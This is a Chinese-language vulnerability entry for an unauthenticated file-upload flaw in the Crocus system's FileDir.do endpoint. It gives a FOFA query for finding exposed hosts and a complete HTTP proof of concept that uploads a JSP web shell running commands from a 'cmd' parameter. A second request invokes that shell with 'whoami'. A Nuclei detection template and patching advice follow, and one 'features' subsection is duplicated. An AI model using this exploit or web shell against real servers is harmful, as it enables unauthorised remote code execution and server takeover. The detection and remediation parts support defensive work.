# 锐明技术Crocus系统 FileDir.do 文件上传漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 锐明技术Crocus系统 FileDir.do 文件上传漏洞 |
| 漏洞类型 | 文件上传导致RCE |
| 组件 | 锐明技术Crocus系统 |
| 严重程度 | 高危 |

## 漏洞概述

锐明技术Crocus系统 FileDir.do 文件上传接口存在安全漏洞，未经身份验证的攻击者可通过构造恶意上传请求，绕过文件类型限制，将任意文件上传至服务器，进而可能实现远程代码执行或服务器控制，影响系统的完整性和安全性。

## 测绘语法

### FOFA
```
body="/ThirdResource/respond/respond.min.js" && title="Crocus"
```

## 漏洞复现

### POC

**上传请求**
```http
POST /FileDir.do?Action=Upload HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Content-Length: 206
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg

<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

**访问Shell**
```http
GET /Plugin/FileManage/Temp/177486967639047.jsp?cmd=whoami HTTP/1.1
Host: target
Cookie: JSESSIONID=2C6C1EA56F64F4B732C42C8BACB59906
```

### 特征
- 上传路径：`/FileDir.do?Action=Upload`
- 访问路径：`/Plugin/FileManage/Temp/*.jsp`
- 响应特征：`{"state":"success"}` 或文件路径返回

### 特征
- 上传路径：`/FileDir.do?Action=Upload`
- 响应特征：`{"state":"success"}` 或文件路径返回

## Nuclei检测模板

```yaml
id: crocus-filedir-upload

info:
  name: Crocus FileDir.do File Upload RCE
  author: fortune
  severity: high
  description: 锐明技术Crocus系统 FileDir.do 文件上传漏洞
  reference:
    - https://mp.weixin.qq.com/s/AJxbUDUSzVdwh7cbYdIIrQ
  tags: crocus,fileupload,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/FileDir.do?Action=Upload"
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}
    body: |
      ------WebKitFormBoundary{{randstr}}
      Content-Disposition: form-data; name="file"; filename="test_{{randstr}}.jsp"
      Content-Type: image/jpeg

      <%out.println("{{randstr}}");%>
      ------WebKitFormBoundary{{randstr}}--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
          - ".jsp"
```

## 修复建议

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限
4. 严格限制上传文件类型，禁用可执行脚本